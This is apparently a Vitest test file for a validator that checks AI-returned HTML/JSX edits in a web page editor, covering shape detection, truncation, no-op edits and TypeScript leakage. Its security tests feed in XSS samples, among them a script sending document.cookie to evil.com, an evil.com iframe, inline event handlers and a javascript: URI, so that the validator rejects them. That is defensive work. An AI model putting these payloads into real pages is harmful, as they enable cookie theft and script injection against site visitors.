import { describe, it, expect } from "vitest";
import {
  validateResponse,
  detectResponseShape,
} from "../lib/byo-ai/validate-response";

// Helper — build a "reasonable" input/output pair for length checks.
// 500 chars is comfortably above the 50-char floor and gives the
// length-ratio test a meaningful range to play with.
function pad(s: string, len: number): string {
  while (s.length < len) s += " ";
  return s;
}

describe("detectResponseShape", () => {
  it("classifies a bare element as 'element'", () => {
    expect(detectResponseShape('<a href="#" class="x">Go</a>')).toBe("element");
    expect(
      detectResponseShape('<button className="b">Hi</button>'),
    ).toBe("element");
  });

  it("classifies a JSX module as 'full-file'", () => {
    expect(
      detectResponseShape("export default function App() { return <div/>; }"),
    ).toBe("full-file");
    expect(detectResponseShape("import React from 'react';\n<div/>")).toBe(
      "full-file",
    );
    expect(detectResponseShape("const X = 1;\n<div/>")).toBe("full-file");
  });

  it("classifies an HTML document as 'full-file'", () => {
    expect(detectResponseShape("<!DOCTYPE html><html></html>")).toBe(
      "full-file",
    );
    expect(detectResponseShape("<html><body></body></html>")).toBe(
      "full-file",
    );
  });

  it("treats an element whose TEXT contains module keywords as 'element' (H-2)", () => {
    // The text content "export"/"import" must NOT trigger full-file —
    // otherwise setCode would replace the whole template with one button.
    expect(detectResponseShape("<button>Export to PDF</button>")).toBe(
      "element",
    );
    expect(detectResponseShape("<a href='#'>import your data</a>")).toBe(
      "element",
    );
    expect(
      detectResponseShape("<p>const tutorials and function guides</p>"),
    ).toBe("element");
  });
});

describe("validateResponse — 787-vs-83879 regression (2026-05-24)", () => {
  // Reproduces the exact field failure: user pasted a ~787-char restyled
  // <a> element against an 83879-char source. It was classified
  // full-file + rejected as "suspiciously short ... truncated file."
  // A response that's <0.4× the source size is an element, full stop.
  const HUGE_SOURCE = "x".repeat(83879);
  const TARGET =
    '<a data-dropin-id="aaaaae3J" href="#" class="bg-white text-slate-900 px-5 py-2 rounded-full text-sm font-bold hover:bg-teal-50 hover:scale-105 transition-all shadow-[0_0_20px_rgba(255,255,255,0.3)]">Get Started</a>';

  it("classifies a small element response as element when source is huge", () => {
    const reply =
      '<a data-dropin-id="aaaaae3J" href="#" className="bg-teal-500 text-white px-6 py-3 rounded-full text-sm font-bold hover:bg-teal-600 hover:scale-110 transition-all shadow-[0_0_30px_rgba(20,184,166,0.5)] uppercase tracking-wide">Get Started</a>';
    expect(detectResponseShape(reply, HUGE_SOURCE.length)).toBe("element");
    const r = validateResponse({
      inputSource: HUGE_SOURCE,
      outputSource: reply,
      targetOuterHtml: TARGET,
      kind: "jsx",
    });
    expect(r.ok).toBe(true);
    expect(r.mode).toBe("element");
    expect(r.appliedCode).toContain("bg-teal-500");
  });

  it("accepts an element reply even with leading/trailing prose (no fence)", () => {
    const reply =
      "Here's your restyled link:\n\n" +
      '<a data-dropin-id="aaaaae3J" href="#" className="bg-teal-500 text-white px-6 py-3 rounded-full font-bold">Get Started</a>' +
      "\n\nI kept the text + href and applied the teal gradient. Let me know!";
    const r = validateResponse({
      inputSource: HUGE_SOURCE,
      outputSource: reply,
      targetOuterHtml: TARGET,
      kind: "jsx",
    });
    expect(r.ok).toBe(true);
    expect(r.mode).toBe("element");
    // The prose is stripped — appliedCode is just the element.
    expect(r.appliedCode?.startsWith("<a")).toBe(true);
    expect(r.appliedCode).not.toContain("Here's your");
    expect(r.appliedCode).not.toContain("Let me know");
  });

  it("accepts an element reply that leads with an extracted const", () => {
    // Some AIs hoist the long className into a const, then the element.
    // The reply doesn't start with `<`, but at <0.4× source it's still
    // an element — the markup slice grabs the <a>.
    const reply =
      'const linkClasses = "bg-teal-500 text-white px-6 py-3 rounded-full";\n' +
      '<a data-dropin-id="aaaaae3J" href="#" className="bg-teal-500 text-white px-6 py-3 rounded-full font-bold">Get Started</a>';
    const r = validateResponse({
      inputSource: HUGE_SOURCE,
      outputSource: reply,
      targetOuterHtml: TARGET,
      kind: "jsx",
    });
    expect(r.ok).toBe(true);
    expect(r.mode).toBe("element");
    expect(r.appliedCode?.startsWith("<a")).toBe(true);
  });

  it("still rejects a genuinely truncated FULL file (source-sized but placeholder)", () => {
    // A response that IS roughly source-sized but truncated mid-way
    // should still be caught as full-file (size rule only reroutes the
    // SMALL ones).
    const truncated =
      "export default function App() {\n  // ... rest of the code unchanged ...\n  return <div/>;\n}" +
      "y".repeat(50000);
    const r = validateResponse({
      inputSource: HUGE_SOURCE,
      outputSource: truncated,
      targetOuterHtml: TARGET,
      kind: "jsx",
    });
    expect(r.ok).toBe(false);
    // Placeholder truncation is now caught globally (pre-shape), so the
    // mode is null — the point is it's REJECTED, not silently applied.
    expect(r.reason?.toLowerCase()).toContain("truncat");
  });
});

describe("validateResponse — element mode (2026-05-22)", () => {
  it("accepts a bare restyled element + reports mode 'element'", () => {
    const target = '<a data-dropin-id="aaa" href="#" class="old">Go</a>';
    const output =
      '<a data-dropin-id="aaa" href="#" class="rounded-full bg-red-500 px-6 py-3 text-white">Go</a>';
    const r = validateResponse({
      inputSource: "x".repeat(50000),
      outputSource: output,
      targetOuterHtml: target,
      kind: "jsx",
    });
    expect(r.ok).toBe(true);
    expect(r.mode).toBe("element");
  });

  it("rejects an element identical to the target (no-op)", () => {
    const target = '<a data-dropin-id="aaa" href="#" class="old">Go</a>';
    // Same element, only the OID differs — normalized they're equal.
    const output = '<a data-dropin-id="bbb" href="#" class="old">Go</a>';
    const r = validateResponse({
      inputSource: "x".repeat(50000),
      outputSource: output,
      targetOuterHtml: target,
      kind: "jsx",
    });
    expect(r.ok).toBe(false);
    expect(r.mode).toBe("element");
    expect(r.reason?.toLowerCase()).toContain("identical");
  });

  it("rejects an element that smuggles a <script> tag", () => {
    const target = '<a href="#" class="old">Go</a>';
    const output =
      '<a href="#" class="new">Go</a><script>fetch("//evil")</script>';
    const r = validateResponse({
      inputSource: "x".repeat(50000),
      outputSource: output,
      targetOuterHtml: target,
      kind: "html",
    });
    expect(r.ok).toBe(false);
    expect(r.mode).toBe("element");
    expect(r.reason?.toLowerCase()).toContain("script");
  });

  it("rejects an element with an unbalanced/duplicate closing tag (JSX)", () => {
    // The 2026-05-24 field bug: AI returned `<a ...>Log In</a></a>` →
    // patched in → "Expected corresponding JSX closing tag" → blank
    // preview. Must be caught at validation, not at the iframe.
    const target = '<a href="#" class="old">Log In</a>';
    const broken = '<a href="#" className="new text-white">Log In</a>\n</a>';
    const r = validateResponse({
      inputSource: "x".repeat(50000),
      outputSource: broken,
      targetOuterHtml: target,
      kind: "jsx",
    });
    expect(r.ok).toBe(false);
    expect(r.mode).toBe("element");
    expect(r.reason?.toLowerCase()).toMatch(/valid jsx|unbalanced|duplicate/);
  });

  it("repairs a HEADLESS element (opening <a dropped in copy/paste)", () => {
    // The 2026-05-24 field case: Claude returned a multi-line <a>, but
    // the opening `<a` line was lost in copy/paste, so the reply starts
    // with attributes. We reconstruct the opening tag from the closing
    // </a> + the target tag.
    const target =
      '<a data-dropin-id="aaaaaeuZ" href="#" class="bg-white text-deep px-5 py-2.5 rounded-full">Get App</a>';
    const headless =
      'data-dropin-id="aaaaaeuZ"\n' +
      '  href="#"\n' +
      '  className="relative inline-block bg-deep text-white px-6 py-3 rounded-lg shadow-lg"\n' +
      '  data-dropin-loc="258:16:258:237:258:226"\n' +
      '  data-vibe-selected=""\n' +
      ">\n  Get App\n</a>";
    const r = validateResponse({
      inputSource: "x".repeat(50000),
      outputSource: headless,
      targetOuterHtml: target,
      kind: "jsx",
    });
    expect(r.ok).toBe(true);
    expect(r.mode).toBe("element");
    // Reconstructed markup is a valid <a> opening + content + close.
    expect(r.appliedCode?.startsWith("<a")).toBe(true);
    expect(r.appliedCode).toContain("bg-deep");
    expect(r.appliedCode).toContain("Get App");
  });

  it("accepts a well-formed nested element (JSX parses fine)", () => {
    const target = '<a href="#" class="old">Log In</a>';
    const good =
      '<a href="#" className="new"><span className="icon">→</span> Log In</a>';
    const r = validateResponse({
      inputSource: "x".repeat(50000),
      outputSource: good,
      targetOuterHtml: target,
      kind: "jsx",
    });
    expect(r.ok).toBe(true);
    expect(r.mode).toBe("element");
  });

  it("skips full-file length checks for element mode (tiny element vs huge source)", () => {
    // 56KB source, 200-char element — the old full-file 0.5× floor
    // would reject this. Element mode must NOT apply that check.
    const target = '<button class="old px-4 py-2">Submit</button>';
    const output =
      '<button class="rounded-full bg-gradient-to-r from-fuchsia-500 to-rose-500 px-6 py-3 text-white shadow-xl">Submit</button>';
    const r = validateResponse({
      inputSource: "x".repeat(56000),
      outputSource: output,
      targetOuterHtml: target,
      kind: "html",
    });
    expect(r.ok).toBe(true);
    expect(r.mode).toBe("element");
  });
});

describe("validateResponse — length sanity", () => {
  it("accepts response within [0.5×, 1.5×] of input length", () => {
    const input = pad("<html><body><button>x</button></body></html>", 500);
    const output = pad("<html><body><button>y</button></body></html>", 500);
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: "<button>x</button>",
      kind: "html",
    });
    expect(r.ok).toBe(true);
  });

  it("rejects empty response", () => {
    const r = validateResponse({
      inputSource: pad("<html></html>", 500),
      outputSource: "",
      targetOuterHtml: "<a>x</a>",
      kind: "html",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("empty");
  });

  it("rejects response under 50 chars", () => {
    const r = validateResponse({
      inputSource: pad("<html></html>", 500),
      outputSource: "<html></html>",
      targetOuterHtml: "<a>x</a>",
      kind: "html",
    });
    expect(r.ok).toBe(false);
  });

  it("rejects response under 0.5× input length (suspected truncation)", () => {
    const input = pad("<html></html>", 1000);
    const output = pad("<html></html>", 200);
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: "<a>x</a>",
      kind: "html",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("short");
  });

  it("rejects response over 1.5× input length (runaway expansion)", () => {
    // 6000 chars vs 4000 source: ratio 1.5+, additive floor (+2000)
    // ALSO blown (6000 > 4000 + 2000 = 6000 is the boundary, so go +1)
    const input = pad("<html></html>", 4000);
    const output = pad("<html></html>", 6001);
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: "<a>x</a>",
      kind: "html",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("long");
  });

  it("accepts small-file expansion past 1.5× via the +2000 additive floor (H4)", () => {
    // 800 chars → 2200 chars (2.75× ratio) — would have been
    // rejected before the additive floor. Now: max(1.5×, +2000)
    // → max(1200, 2800) = 2800 → 2200 < 2800 → accepts.
    const input = pad("<html><body><button>x</button></body></html>", 800);
    const output = pad(
      "<html><body><button>x</button></body></html>",
      2200,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: "<button>x</button>",
      kind: "html",
    });
    expect(r.ok).toBe(true);
  });
});

describe("validateResponse — no-op detection", () => {
  it("rejects when the target's outerHtml is still verbatim in response", () => {
    const target =
      '<button class="bg-stone-200 px-4 py-2">Get Started</button>';
    const input = pad(`<html><body>${target}</body></html>`, 500);
    const output = pad(`<html><body>${target}</body></html>`, 500);
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: target,
      kind: "html",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toMatch(/still in the response|swap|ignored/);
  });

  it("ignores data-dropin-id attributes when comparing (OIDs shift legitimately)", () => {
    // Frontier models may regenerate OIDs even on a real swap. We
    // strip those before comparing so a TRUE no-op is the only thing
    // that trips this check.
    const target =
      '<button data-dropin-id="abc123" class="bg-stone-200">Get Started</button>';
    const input = pad(`<html><body>${target}</body></html>`, 500);
    const newTarget =
      '<button data-dropin-id="def456" class="bg-fuchsia-500">Get Started</button>';
    const output = pad(`<html><body>${newTarget}</body></html>`, 500);
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: target,
      kind: "html",
    });
    expect(r.ok).toBe(true);
  });

  it("skips no-op check when target snippet is too short to be useful", () => {
    // A 15-char target like `<a>x</a>` is too generic to use for
    // change detection — many real swaps would still contain it
    // (e.g. some other anchor in the file). Skip the check at <20.
    const target = "<a>x</a>";
    const input = pad(`<html><body>${target}<a>y</a></body></html>`, 500);
    const output = pad(
      `<html><body><button>new</button><a>y</a></body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: target,
      kind: "html",
    });
    expect(r.ok).toBe(true);
  });

  it("accepts cascade swap: input has 3 copies, output has 2 (H1 fix)", () => {
    // Cascade case: .map() renders 3 buttons; user picks one; AI
    // detaches and swaps one. Input has 3 instances of the target's
    // outerHtml; output has 2 (the detached one became something
    // else). Pre-H1 fix: binary `includes` check rejected this as
    // no-op. Post-fix: count occurrences and accept when count
    // dropped.
    const target =
      '<button class="bg-stone-200 px-4 py-2 text-base">Card Title</button>';
    const input = pad(
      `<html><body>${target}${target}${target}</body></html>`,
      500,
    );
    const newButton =
      '<button class="rounded-full bg-fuchsia-500">Card Title</button>';
    const output = pad(
      `<html><body>${target}${target}${newButton}</body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: target,
      kind: "html",
    });
    expect(r.ok).toBe(true);
  });

  it("rejects when input had 3 copies and output STILL has 3 (real no-op)", () => {
    // Confirms the new count-based check still rejects the actual
    // no-op case for cascade elements.
    const target =
      '<button class="bg-stone-200 px-4 py-2 text-base">Card Title</button>';
    const input = pad(
      `<html><body>${target}${target}${target}</body></html>`,
      500,
    );
    const output = pad(
      `<html><body>${target}${target}${target}</body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: target,
      kind: "html",
    });
    expect(r.ok).toBe(false);
  });
});

describe("validateResponse — security checks", () => {
  it("rejects onclick= event handler", () => {
    const input = pad("<html><body></body></html>", 500);
    const output = pad(
      `<html><body><button onclick="alert(1)">x</button></body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: "<button>old</button>",
      kind: "html",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("event-handler");
  });

  it("rejects onerror= event handler", () => {
    const output = pad(
      `<html><body><img src="x" onerror="alert(1)"></body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: pad("<html></html>", 500),
      outputSource: output,
      targetOuterHtml: "<button>old</button>",
      kind: "html",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("event-handler");
  });

  it("rejects onmouseover= event handler (case-insensitive)", () => {
    const output = pad(
      `<html><body><div onMouseOver="x()">hi</div></body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: pad("<html></html>", 500),
      outputSource: output,
      targetOuterHtml: "<button>old</button>",
      kind: "html",
    });
    expect(r.ok).toBe(false);
  });

  it("rejects javascript: URI in href", () => {
    const output = pad(
      `<html><body><a href="javascript:alert(1)">x</a></body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: pad("<html></html>", 500),
      outputSource: output,
      targetOuterHtml: "<button>old</button>",
      kind: "html",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("javascript:");
  });

  it("rejects a NEW <script> tag the AI added (count-based)", () => {
    const oldTarget = '<button class="old">Go</button>';
    const input = pad(
      `<html><head><script src="https://cdn.tailwindcss.com"></script></head><body>${oldTarget}</body></html>`,
      500,
    );
    // Output keeps the tailwind script (1) + adds an evil one (2 total)
    const output = pad(
      `<html><head><script src="https://cdn.tailwindcss.com"></script></head><body><button class="new">Go</button><script>fetch('//evil.com?c='+document.cookie)</script></body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: oldTarget,
      kind: "html",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("script");
  });

  it("ALLOWS the existing <script> count to be preserved (Tailwind config)", () => {
    const oldTarget = '<button class="old">Go</button>';
    const input = pad(
      `<html><head><script src="https://cdn.tailwindcss.com"></script></head><body>${oldTarget}</body></html>`,
      500,
    );
    // Output keeps exactly 1 script — no new ones added.
    const output = pad(
      `<html><head><script src="https://cdn.tailwindcss.com"></script></head><body><button class="new">Go</button></body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: oldTarget,
      kind: "html",
    });
    expect(r.ok).toBe(true);
  });

  it("rejects a NEW <iframe> tag", () => {
    const oldTarget = '<button class="old">Go</button>';
    const input = pad(`<html><body>${oldTarget}</body></html>`, 500);
    const output = pad(
      `<html><body><button class="new">Go</button><iframe src="https://evil.com"></iframe></body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: oldTarget,
      kind: "html",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("iframe");
  });

  it("allows legitimate href URLs (http, https, mailto, #anchor)", () => {
    const output = pad(
      `<html><body>
        <a href="https://example.com">a</a>
        <a href="mailto:x@y.com">b</a>
        <a href="#hero">c</a>
        <a href="/about">d</a>
      </body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: pad("<html></html>", 500),
      outputSource: output,
      targetOuterHtml: "<button>old</button>",
      kind: "html",
    });
    expect(r.ok).toBe(true);
  });

  it("ignores onclick-like substring inside text content (whole-word boundary)", () => {
    // "I clicked the button" or "the on-click handler" in a code
    // sample as text content shouldn't trip — only ACTUAL on*= attrs.
    const output = pad(
      `<html><body><p>This site uses on-click animations</p></body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: pad("<html></html>", 500),
      outputSource: output,
      targetOuterHtml: "<button>old</button>",
      kind: "html",
    });
    expect(r.ok).toBe(true);
  });

  it("ACCEPTS JSX expression event handlers (onClick={fn}) — L1 fix", () => {
    // The critical L1 bug: the old regex rejected every JSX onClick.
    // Interactive templates legitimately carry onClick / onChange /
    // onSubmit with {expression} values. Only STRING-valued handlers
    // (the XSS vector) should be rejected.
    const oldTarget = '<button className="old">Submit</button>';
    const newTarget = '<button className="new">Submit</button>';
    const input = pad(
      `export default function X() {
        const [n, setN] = React.useState(0);
        return <div onClick={() => setN(n + 1)}>${oldTarget}</div>;
      }`,
      500,
    );
    const output = pad(
      `export default function X() {
        const [n, setN] = React.useState(0);
        return <div onClick={() => setN(n + 1)}>${newTarget}</div>;
      }`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: oldTarget,
      kind: "jsx",
    });
    expect(r.ok).toBe(true);
  });

  it("still rejects STRING-valued event handlers (onerror=\"...\")", () => {
    const output = pad(
      `<html><body><img src="x" onerror="alert(1)"></body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: pad("<html></html>", 500),
      outputSource: output,
      targetOuterHtml: "<button>old</button>",
      kind: "html",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("event-handler");
  });
});

describe("validateResponse — placeholder truncation (C1)", () => {
  function bigInput(): string {
    return pad(
      `const A = [1,2,3];\nconst B = {x:1};\nexport default function App() { return <div><button>old</button></div>; }`,
      4000,
    );
  }

  it("rejects // ... rest of the code unchanged", () => {
    const output =
      `const A = [1,2,3];\n// ... rest of the code unchanged ...\n<button>new</button>`;
    const r = validateResponse({
      inputSource: bigInput(),
      outputSource: pad(output, 2100),
      targetOuterHtml: "<button>old</button>",
      kind: "jsx",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("truncat");
  });

  it("rejects {/* ... unchanged ... */} JSX placeholder", () => {
    const output =
      `export default function App() {\n  {/* ... unchanged ... */}\n  return <button>new</button>;\n}`;
    const r = validateResponse({
      inputSource: bigInput(),
      outputSource: pad(output, 2100),
      targetOuterHtml: "<button>old</button>",
      kind: "jsx",
    });
    expect(r.ok).toBe(false);
  });

  it("rejects 'rest of the component remains the same'", () => {
    const output =
      `export default function App() {\n  // rest of the component remains the same\n  return <button>new</button>;\n}`;
    const r = validateResponse({
      inputSource: bigInput(),
      outputSource: pad(output, 2100),
      targetOuterHtml: "<button>old</button>",
      kind: "jsx",
    });
    expect(r.ok).toBe(false);
  });

  it("rejects <!-- remaining markup unchanged --> in HTML mode", () => {
    const output =
      `<html><body><button>new</button>\n<!-- ... remaining markup unchanged --></body></html>`;
    const r = validateResponse({
      inputSource: pad("<html><body><button>old</button><div>lots more</div></body></html>", 4000),
      outputSource: pad(output, 2100),
      targetOuterHtml: "<button>old</button>",
      kind: "html",
    });
    expect(r.ok).toBe(false);
  });

  it("does NOT false-reject legitimate spread operators ({...props})", () => {
    // The spread operator is `...identifier` with NO space — distinct
    // from placeholder `... rest` (with space).
    const oldTarget = '<button className="old">Submit</button>';
    const newTarget = '<button className="new">Submit</button>';
    const input = pad(
      `function Btn({ className, ...rest }) { return <button {...rest}>x</button>; }\nexport default function App() { return <div>${oldTarget}</div>; }`,
      500,
    );
    const output = pad(
      `function Btn({ className, ...rest }) { return <button {...rest}>x</button>; }\nexport default function App() { return <div>${newTarget}</div>; }`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: oldTarget,
      kind: "jsx",
    });
    expect(r.ok).toBe(true);
  });

  it("does NOT false-reject https:// URLs in comments", () => {
    const oldTarget = '<a class="old">Link</a>';
    const newTarget = '<a class="new">Link</a>';
    const input = pad(
      `<html><body>\n<!-- see https://example.com/docs -->\n${oldTarget}</body></html>`,
      500,
    );
    const output = pad(
      `<html><body>\n<!-- see https://example.com/docs -->\n${newTarget}</body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: oldTarget,
      kind: "html",
    });
    expect(r.ok).toBe(true);
  });
});

describe("validateResponse — top-level decl survival (C1 companion)", () => {
  it("rejects when 2+ top-level decls vanish (silent truncation)", () => {
    // Realistic full-file fixture — output is ~same size as input
    // (passes the length check) but silently dropped 3 top-level
    // const decls. Real content (not whitespace) so it survives trim +
    // stays structurally full-file. The decl-survival check is what
    // must catch this.
    const FILLER =
      "className='mx-auto max-w-5xl px-6 py-10 grid grid-cols-3 gap-8 items-center text-center'";
    const input =
      `const SCREEN_FRAMES = [{a:1},{a:2},{a:3}];\n` +
      `const VOICES = [{v:'x'},{v:'y'}];\n` +
      `const FAQ = [{q:'?'}];\n` +
      `export default function App() { return <div ${FILLER}><button>old</button></div>; }`;
    // Output: keeps App (similar length via filler) but no SCREEN_FRAMES
    // / VOICES / FAQ.
    const output =
      `export default function App() {\n` +
      `  const items = [{a:1},{a:2},{a:3},{v:'x'},{v:'y'},{q:'?'}];\n` +
      `  return <div ${FILLER}><button>new</button></div>;\n}`;
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: "<button>old</button>",
      kind: "jsx",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("missing");
  });

  it("tolerates a single legitimately-removed decl", () => {
    const input = pad(
      `const A = [1];\nconst B = [2];\nconst DEAD = [3];\nexport default function App() { return <button>old</button>; }`,
      500,
    );
    // Output kept A + B + App, dropped only DEAD (1 missing → tolerated)
    const output = pad(
      `const A = [1];\nconst B = [2];\nexport default function App() { return <button class="new">new</button>; }`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: "<button>old</button>",
      kind: "jsx",
    });
    expect(r.ok).toBe(true);
  });
});

describe("validateResponse — TypeScript detection (C2, JSX mode only)", () => {
  function tsInput(): string {
    const oldTarget = '<button className="old">Go</button>';
    return pad(
      `export default function App() { return <div>${oldTarget}</div>; }`,
      500,
    );
  }

  it("rejects type annotations (: string)", () => {
    const output = pad(
      `export default function App() { const label: string = "Go"; return <div><button className="new">{label}</button></div>; }`,
      500,
    );
    const r = validateResponse({
      inputSource: tsInput(),
      outputSource: output,
      targetOuterHtml: '<button className="old">Go</button>',
      kind: "jsx",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("typescript");
  });

  it("rejects interface declarations", () => {
    const output = pad(
      `interface Props { x: number }\nexport default function App() { return <button className="new">Go</button>; }`,
      500,
    );
    const r = validateResponse({
      inputSource: tsInput(),
      outputSource: output,
      targetOuterHtml: '<button className="old">Go</button>',
      kind: "jsx",
    });
    expect(r.ok).toBe(false);
  });

  it("rejects 'as const'", () => {
    const output = pad(
      `export default function App() { const x = [1,2] as const; return <button className="new">Go</button>; }`,
      500,
    );
    const r = validateResponse({
      inputSource: tsInput(),
      outputSource: output,
      targetOuterHtml: '<button className="old">Go</button>',
      kind: "jsx",
    });
    expect(r.ok).toBe(false);
  });

  it("does NOT run TS detection in HTML mode", () => {
    // HTML can legitimately contain `: string` in text content or CSS.
    const output = pad(
      `<html><body><style>.x::after { content: string }</style><button class="new">Go</button></body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: pad(
        `<html><body><button class="old">Go</button></body></html>`,
        500,
      ),
      outputSource: output,
      targetOuterHtml: '<button class="old">Go</button>',
      kind: "html",
    });
    expect(r.ok).toBe(true);
  });

  it("does NOT false-reject CSS-in-JS object literals (string VALUES)", () => {
    // `color: '#fff'` is a string VALUE, not the bare type word.
    const oldTarget = '<button className="old">Go</button>';
    const newTarget = '<button className="new" style={{ color: "#fff" }}>Go</button>';
    const input = pad(
      `export default function App() { return <div>${oldTarget}</div>; }`,
      500,
    );
    const output = pad(
      `export default function App() { return <div>${newTarget}</div>; }`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: oldTarget,
      kind: "jsx",
    });
    expect(r.ok).toBe(true);
  });

  // REGRESSION (2026-05-25): the old regex TS heuristics false-rejected
  // ordinary UI text — "Export as PDF" matched `as PDF`, "downtime: never"
  // matched `: never`, "type: string" matched `: string`. The parse-based
  // check (parsesAsPlainJsx) can't be fooled by prose. These element-mode
  // replies are all legitimate plain JSX and MUST be accepted.
  const UI_TEXT_FALSE_POSITIVES: Array<[string, string, string]> = [
    ["Export as PDF", '<button className="old">Go</button>', '<button className="bg-coral text-white px-4 py-2">Export as PDF</button>'],
    ["Save as Draft", '<a href="#">Go</a>', '<a href="#" className="underline">Save as Draft</a>'],
    ["Sign in as Admin", '<button className="old">Go</button>', '<button className="px-3 py-2">Sign in as Admin</button>'],
    ["downtime: never", '<p>Go</p>', '<p className="text-sm text-gray-400">Uptime SLA — downtime: never.</p>'],
    ["plan cost: number", '<span>Go</span>', '<span className="font-mono">Plan cost: number to be confirmed</span>'],
    ["field type: string", '<code>Go</code>', '<code className="text-xs">field type: string required</code>'],
    ["Export as CSV or as JSON", '<div className="old">Go</div>', '<div className="card"><h4>Data</h4><p>Export as CSV or as JSON anytime.</p></div>'],
  ];
  for (const [name, target, reply] of UI_TEXT_FALSE_POSITIVES) {
    it(`accepts UI text that looks like TS: "${name}"`, () => {
      const r = validateResponse({
        inputSource: "x".repeat(5000),
        outputSource: reply,
        targetOuterHtml: target,
        kind: "jsx",
      });
      expect(r.ok).toBe(true);
      expect(r.mode).toBe("element");
    });
  }

  it("still rejects genuine TS in code position (`as` cast in an expression)", () => {
    const r = validateResponse({
      inputSource: "x".repeat(5000),
      outputSource: '<div className="x">{(count as number)}</div>',
      targetOuterHtml: '<div className="old">Go</div>',
      kind: "jsx",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("typescript");
  });
});

describe("validateResponse — JSX-mode wrong-language guard", () => {
  it("rejects a plain HTML document returned in JSX mode", () => {
    const oldTarget = '<button className="old">Go</button>';
    const input = pad(
      `export default function App() { return <div>${oldTarget}</div>; }`,
      500,
    );
    // AI returned a full HTML doc instead of the React component.
    const output = pad(
      `<!DOCTYPE html><html><body><button class="new">Go</button></body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: oldTarget,
      kind: "jsx",
    });
    expect(r.ok).toBe(false);
    expect(r.reason?.toLowerCase()).toContain("html document");
  });

  it("accepts a normal JSX component (no DOCTYPE) in JSX mode", () => {
    const oldTarget = '<button className="old">Go</button>';
    const newTarget = '<button className="new">Go</button>';
    const input = pad(
      `export default function App() { return <div>${oldTarget}</div>; }`,
      500,
    );
    const output = pad(
      `export default function App() { return <div>${newTarget}</div>; }`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: oldTarget,
      kind: "jsx",
    });
    expect(r.ok).toBe(true);
  });

  it("allows DOCTYPE in HTML mode (it's expected there)", () => {
    const oldTarget = '<button class="old">Go</button>';
    const newTarget = '<button class="new">Go</button>';
    const input = pad(
      `<!DOCTYPE html><html><body>${oldTarget}</body></html>`,
      500,
    );
    const output = pad(
      `<!DOCTYPE html><html><body>${newTarget}</body></html>`,
      500,
    );
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: oldTarget,
      kind: "html",
    });
    expect(r.ok).toBe(true);
  });
});

describe("validateResponse — happy path", () => {
  it("accepts a clean restyled element response", () => {
    const oldTarget = '<button class="bg-stone-200 px-4 py-2">Submit</button>';
    const newTarget =
      '<button class="rounded-full bg-gradient-to-r from-fuchsia-500 to-rose-500 px-6 py-3 text-white">Submit</button>';
    const input = pad(`<html><body>${oldTarget}</body></html>`, 500);
    const output = pad(`<html><body>${newTarget}</body></html>`, 500);
    const r = validateResponse({
      inputSource: input,
      outputSource: output,
      targetOuterHtml: oldTarget,
      kind: "html",
    });
    expect(r.ok).toBe(true);
    expect(r.reason).toBeNull();
  });

  it("accepts a JSX-mode swap response", () => {
    const oldTarget = '<button className="bg-stone-200">Hi</button>';
    const newTarget = '<button className="bg-fuchsia-500">Hi</button>';
    const input = pad(
      `export default function X() { return <div>${oldTarget}</div>; }`,
      500,
    );
    const output = pad(
      `export default function X() { return <div>${newTarget}</div>; }`,
      500,
    );
    const r = validateResponse({
